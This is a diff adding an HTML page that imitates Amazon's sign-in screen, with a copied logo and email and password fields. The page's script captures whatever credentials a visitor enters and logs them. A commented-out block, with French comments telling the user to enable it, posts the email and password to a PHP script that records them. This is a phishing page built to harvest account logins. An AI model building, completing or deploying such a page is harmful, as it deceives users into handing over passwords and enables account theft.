@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Amazon Sign-In</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="container">
+    <img src="https://i.postimg.cc/26gK0MnT/temp-Imagerq-X4i-G.avif" alt="Amazon Logo" class="logo">
+    <div class="login-box">
+      <h1>Sign-In</h1>
+      <form id="loginForm">
+        <label for="email">Email or mobile phone number</label>
+        <input type="text" id="email" name="email">
+        <label for="password">Password</label>
+        <input type="password" id="password" name="password">
+        <button type="submit">Sign-In</button>
+        <p><a href="#">Forgot your password?</a></p>
+      </form>
+      <div class="new-account">
+        <p>New to Amazon? <a href="#">Create an Amazon account</a></p>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    document.getElementById('loginForm').addEventListener('submit', function(event) {
+      event.preventDefault(); // Empêche la soumission normale du formulaire
+
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+
+      // Affiche les informations de connexion dans la console
+      console.log("Email:", email);
+      console.log("Password:", password);
+
+      // **Supprime ou commente le code suivant si tu ne veux pas envoyer les données à un serveur.**
+      /*
+      // Envoie les données à un script côté serveur (par exemple, PHP)
+      fetch('enregistrer_donnees.php', { // Remplacez par l'URL de votre script PHP
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/x-www-form-urlencoded'
+        },
+        body: 'email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(password)
+      })
+      .then(response => {
+        if (response.ok) {
+          console.log('Données enregistrées avec succès !');
+        } else {
+          console.error('Erreur lors de l\'enregistrement des données.');
+        }
+      })
+      .catch(error => {
+        console.error('Erreur de réseau:', error);
+      });
+      */
+    });
+  </script>
+</body>
+</html>
